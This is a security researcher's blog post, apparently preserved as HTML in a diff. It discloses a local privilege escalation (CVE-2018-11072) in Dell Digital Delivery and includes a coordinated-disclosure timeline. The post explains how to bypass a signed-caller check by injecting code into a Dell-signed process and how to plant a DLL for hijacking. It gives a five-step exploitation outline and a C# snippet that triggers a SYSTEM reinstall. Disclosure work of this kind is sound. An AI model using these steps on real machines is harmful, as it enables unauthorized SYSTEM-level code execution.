@@ -1,0 +1,525 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Dell Digital Delivery - CVE-2018-11072 - Local Privilege Escalation - </title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="Back in March or April I began reversing a slew of Dell applications installed
+on a laptop I had. Many of them had privileged services or processes &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2018/08/22/dell-digital-delivery-eop">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <!--<header role="banner"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>-->
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Dell Digital Delivery - CVE-2018-11072 - Local Privilege Escalation</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2018-08-22T14:10:04-07:00" pubdate data-updated="true">Aug 22<span>nd</span>, 2018</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Back in March or April I began reversing a slew of Dell applications installed
+on a laptop I had. Many of them had privileged services or processes running
+and seemed to perform a lot of different complex actions. I previously
+disclosed a LPE in SupportAssist[0], and identified another in their Digital
+Delivery platform. This post will detail a Digital Delivery vulnerability and
+how it can be exploited. This was privately discovered and disclosed, and no
+known active exploits are in the wild. Dell has issued a security advisory for
+this issue, which can be found here[4].</p>
+
+<p>I&rsquo;ll have another follow-up post detailing the internals of this application
+and a few others to provide any future researchers with a starting point.
+Both applications are rather complex and expose a large attack surface.
+If you&rsquo;re interested in bug hunting LPEs in large C#/C++ applications, it&rsquo;s
+a fine place to begin.</p>
+
+<p>Dell&rsquo;s Digital Delivery[1] is a platform for buying and installing system
+software. It allows users to purchase or manage software packages and reinstall
+them as necessary. Once again, it comes &ldquo;..preinstalled on most Dell
+systems.&rdquo;[1]</p>
+
+<h2>Bug</h2>
+
+<p>The Digital Delivery service runs as SYSTEM under the name DeliveryService,
+which runs the DeliveryService.exe binary. A userland binary, DeliveryTray.exe,
+is the user-facing component that allows users to view installed applications
+or reinstall previously purchased ones.</p>
+
+<p>Communication from DeliveryTray to DeliveryService is performed via a
+Windows Communication Foundation (WCF) named pipe. If you&rsquo;re unfamiliar with
+WCF, it&rsquo;s essentially a standard methodology for exchanging data between two
+endpoints[2]. It allows a service to register a processing endpoint and expose
+functionality, similar to a web server with a REST API.</p>
+
+<p>For those following along at home, you can find the initialization of the WCF
+pipe in <code>Dell.ClientFulfillmentService.Controller.Initialize</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>this._host = WcfServiceUtil.StandupServiceHost(typeof(UiWcfSession),
+</span><span class='line'>                                typeof(IClientFulfillmentPipeService),
+</span><span class='line'>                                "DDDService");</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This invokes <code>Dell.NamedPipe.StandupServiceHost</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ServiceHost host = null;
+</span><span class='line'>string apiUrl = "net.pipe://localhost/DDDService/IClientFulfillmentPipeService";
+</span><span class='line'>Uri realUri = new Uri("net.pipe://localhost/" + Guid.NewGuid().ToString());
+</span><span class='line'>Tryblock.Run(delegate
+</span><span class='line'>{
+</span><span class='line'>  host = new ServiceHost(classType, new Uri[]
+</span><span class='line'>  {
+</span><span class='line'>    realUri
+</span><span class='line'>  });
+</span><span class='line'>  host.AddServiceEndpoint(interfaceType, WcfServiceUtil.CreateDefaultBinding(), string.Empty);
+</span><span class='line'>  host.Open();
+</span><span class='line'>}, null, null);
+</span><span class='line'>AuthenticationManager.Singleton.RegisterEndpoint(apiUrl, realUri.AbsoluteUri);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The endpoint is thus registered and listening and the AuthenticationManager
+singleton is responsible for handling requests. Once a request comes in, the
+AuthenticationManager passes this off to the AuthPipeWorker function which,
+among other things, performs the following authentication:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>string execuableByProcessId = AuthenticationManager.GetExecuableByProcessId(processId);
+</span><span class='line'>bool flag2 = !FileUtils.IsSignedByDell(execuableByProcessId);
+</span><span class='line'>if (!flag2)
+</span><span class='line'>{
+</span><span class='line'>    ...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If the process on the other end of the request is backed by a signed Dell
+binary, the request is allowed and a connection may be established. If not, the
+request is denied.</p>
+
+<p>I noticed that this is new behavior, added sometime between 3.1 (my original
+testing) and 3.5 (latest version at the time, 3.5.1001.0), so I assume Dell is
+aware of this as a potential attack vector. Unfortunately, this is an
+inadequate mitigation to sufficiently protect the endpoint. I was able to get
+around this by simply spawning an executable signed by Dell (DeliveryTray.exe,
+for example) and injecting code into it. Once code is injected, the WCF API
+exposed by the privileged service is accessible.</p>
+
+<p>The endpoint service itself is implemented by <code>Dell.NamedPipe</code>, and exposes a
+dozen or so different functions. Those include:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ArchiveAndResetSettings
+</span><span class='line'>EnableEntitlements
+</span><span class='line'>EnableEntitlementsAsync
+</span><span class='line'>GetAppSetting
+</span><span class='line'>PingTrayApp
+</span><span class='line'>PollEntitlementService
+</span><span class='line'>RebootMachine
+</span><span class='line'>ReInstallEntitlement
+</span><span class='line'>ResumeAllOperations
+</span><span class='line'>SetAppSetting
+</span><span class='line'>SetAppState
+</span><span class='line'>SetEntitlementList
+</span><span class='line'>SetUserDownloadChoice
+</span><span class='line'>SetWallpaper
+</span><span class='line'>ShowBalloonTip
+</span><span class='line'>ShutDownApp
+</span><span class='line'>UpdateEntitlementUiState</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Digital Delivery calls application install packages &ldquo;entitlements&rdquo;, so the
+references to installation/reinstallation are specific to those packages either
+available or presently installed.</p>
+
+<p>One of the first functions I investigated was <code>ReInstallEntitlement</code>, which
+allows one to initiate a reinstallation process of an installed entitlement.
+This code performs the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>private static void ReInstallEntitlementThreadStart(object reInstallArgs)
+</span><span class='line'>{
+</span><span class='line'>    PipeServiceClient.ReInstallArgs ra = (PipeServiceClient.ReInstallArgs)reInstallArgs;
+</span><span class='line'>    PipeServiceClient.TryWcfCall(delegate
+</span><span class='line'>    {
+</span><span class='line'>        PipeServiceClient._commChannel.ReInstall(ra.EntitlementId, ra.RunAsUser);
+</span><span class='line'>    }, string.Concat(new object[]
+</span><span class='line'>    {
+</span><span class='line'>        "ReInstall ",
+</span><span class='line'>        ra.EntitlementId,
+</span><span class='line'>        " ",
+</span><span class='line'>        ra.RunAsUser.ToString()
+</span><span class='line'>    }));
+</span><span class='line'>}
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This builds the arguments from the request and invokes a WCF call, which is
+sent to the WCF endpoint. The <code>ReInstallEntitlement</code> call takes two arguments:
+an entitlement ID and a RunAsUser flag. These are both controlled by the
+caller.</p>
+
+<p>On the server side, <code>Dell.ClientFulfillmentService.Controller</code> handles
+implementation of these functions, and  <code>OnReInstall</code> handles the entitlement
+reinstallation process. It does a couple sanity checks, validates the package
+signature, and hits the <code>InstallationManager</code> to queue the install request. The
+<code>InstallationManager</code> has a job queue and background thread (<code>WorkingThread</code>)
+that occasionally polls for new jobs and, when it receives the install job,
+kicks off <code>InstallSoftware</code>.</p>
+
+<p>Because we&rsquo;re reinstalling an entitlement, the package is cached to disk and
+ready to be installed. I&rsquo;m going to gloss over a few installation steps
+here because it&rsquo;s frankly standard and menial.</p>
+
+<p>The installation packages are located in
+<code>C:\ProgramData\Dell\DigitalDelivery\Downloads\Software\</code> and are first
+unzipped, followed by an installation of the software. In my case, I was
+triggering the installation of <code>Dell Data Protection - Security Tools v1.9.1</code>,
+and if you follow along in procmon, you&rsquo;ll see it startup an install process:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>"C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _
+</span><span class='line'>Security Tools v1.9.1\STSetup.exe" -y -gm2 /S /z"\"CIRRUS_INSTALL,
+</span><span class='line'>SUPPRESSREBOOT=1\""</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The run user for this process is determined by the controllable RunAsUser flag
+and, if set to False, runs as <code>SYSTEM</code> out of the <code>%ProgramData%</code> directory.</p>
+
+<p>During process launch of the <code>STSetup</code> process, I noticed the following in
+procmon:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\VERSION.dll
+</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\UxTheme.dll
+</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\PROPSYS.dll
+</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\apphelp.dll
+</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\Secur32.dll
+</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\api-ms-win-downlevel-advapi32-l2-1-0.dll</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Of interest here is that the parent directory, <code>%ProgramData%\Dell\Digital
+Delivery\Downloads\Software</code> is not writable by any system user, but the
+entitlement package folders, <code>Dell Data Protection - Security Tools</code> in this
+case, is.</p>
+
+<p>This allows non-privileged users to drop arbitrary files into this
+directory, granting us a DLL hijacking opportunity.</p>
+
+<h2>Exploitation</h2>
+
+<p>Exploiting this requires several steps:</p>
+
+<ol>
+<li>Drop a DLL under the appropriate <code>%ProgramData%</code> software package directory</li>
+<li>Launch a new process running an executable signed by Dell</li>
+<li>Inject C# into this process (which is running unprivileged in userland)</li>
+<li>Connect to the WCF named pipe from within the injected process</li>
+<li>Trigger ReInstallEntitlement</li>
+</ol>
+
+
+<p>Steps 4 and 5 can be performed using the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PipeServiceClient client = new PipeServiceClient();
+</span><span class='line'>client.Initialize();
+</span><span class='line'>
+</span><span class='line'>while (PipeServiceClient.AppState == AppState.Initializing)
+</span><span class='line'>  System.Threading.Thread.Sleep(1000);
+</span><span class='line'>
+</span><span class='line'>EntitlementUiWrapper entitle = PipeServiceClient.EntitlementList[0];
+</span><span class='line'>PipeServiceClient.ReInstallEntitlement(entitle.ID, false);
+</span><span class='line'>System.Threading.Thread.Sleep(30000);
+</span><span class='line'>
+</span><span class='line'>PipeServiceClient.CloseConnection();</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The classes used above are imported from <code>NamedPipe.dll</code>. Note that we&rsquo;re
+simply choosing the first entitlement available and reinstalling it. You may
+need to iterate over entitlements to identify the correct package pointing to
+where you dropped your DLL.</p>
+
+<p>I&rsquo;ve provided a PoC on my Github here[3], and Dell has additionally released
+a security advisory, which can be found here[4].</p>
+
+<h2>Timeline</h2>
+
+<p>05/24/18 &ndash; Vulnerability initially reported<br/>
+05/30/18 &ndash; Dell requests further information<br/>
+06/26/18 &ndash; Dell provides update on review and remediation<br/>
+07/06/18 &ndash; Dell provides internal tracking ID and update on progress<br/>
+07/24/18 &ndash; Update request<br/>
+07/30/18 &ndash; Dell confirms they will issue a security advisory and associated CVE<br/>
+08/07/18 &ndash; 90 day disclosure reminder provided<br/>
+08/10/18 &ndash; Dell confirms 8/22 disclosure date alignment<br/>
+08/22/18 &ndash; Public disclosure</p>
+
+<h2>References</h2>
+
+<p>[0] <a href="http://hatriot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">http://hatriot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/</a><br/>
+[1] <a href="https://www.dell.com/learn/us/en/04/flatcontentg/dell-digital-delivery">https://www.dell.com/learn/us/en/04/flatcontentg/dell-digital-delivery</a><br/>
+[2] <a href="https://docs.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf">https://docs.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf</a><br/>
+[3] <a href="https://github.com/hatRiot/bugs">https://github.com/hatRiot/bugs</a><br/>
+[4] <a href="https://www.dell.com/support/article/us/en/04/SLN313559">https://www.dell.com/support/article/us/en/04/SLN313559</a><br/></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2018-08-22T14:10:04-07:00" pubdate data-updated="true">Aug 22<span>nd</span>, 2018</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/elevation-of-privilege/'>elevation of privilege</a>, <a class='category' href='/blog/categories/windows/'>windows</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2018/08/22/dell-digital-delivery-eop/" data-via="" data-counturl="http://hatRiot.github.io/blog/2018/08/22/dell-digital-delivery-eop/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/" title="Previous Post: Dell SupportAssist Driver - Local Privilege Escalation">&laquo; Dell SupportAssist Driver - Local Privilege Escalation</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/08/22/dell-digital-delivery-eop/">Dell Digital Delivery - CVE-2018-11072 - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/06/ntpdc-exploit/">ntpdc local buffer overflow</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/08/27/railo-security-part-four/">railo security - part four - pre-auth remote code execution</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
